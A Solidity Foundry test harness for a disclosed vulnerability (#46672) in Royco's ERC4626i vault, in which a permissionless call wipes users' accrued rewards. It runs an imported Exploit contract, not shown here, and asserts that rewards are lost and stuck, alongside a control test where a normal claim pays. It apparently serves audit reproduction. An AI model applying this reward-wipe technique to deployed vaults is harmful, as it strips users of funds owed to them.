// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./46672-user-rewards-can-be-permissionlessly-erased-cantina-none-roy.sol";

/*//////////////////////////////////////////////////////////////////////////
    Royco ERC4626i — permissionless reward wipe (#46672)
//////////////////////////////////////////////////////////////////////////*/
contract RewardWipeTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.claimedByUser(), 0, "claim paid zero");
        assertGt(e.rewardsBeforeWipe(), 0, "had rewards before wipe");
        assertEq(e.rewardToken().balanceOf(address(e.vault())), e.INCENTIVE(), "stuck");
    }

    /// @notice Control: a single claim without a prior permissionless poke pays rewards.
    function test_singleClaimPays() public {
        MockERC20 asset = new MockERC20("Mock", "MOCK");
        MockERC20 reward = new MockERC20("Reward", "RWD");
        ERC4626i vault = new ERC4626i(asset);
        UserHelper user = new UserHelper();

        uint256 duration = 14 days;
        uint256 incentive = 100 * duration;
        reward.mint(address(this), incentive);
        reward.approve(address(vault), incentive);
        uint256 campaignId = vault.createRewardsCampaign(address(reward), 0, duration, incentive);

        asset.mint(address(this), 10e18);
        asset.approve(address(vault), 10e18);
        vault.deposit(10e18, address(user));
        user.optIn(vault, campaignId);

        uint256 claimed = user.claim(vault, campaignId);
        assertGt(claimed, 0, "single claim should pay");
    }
}
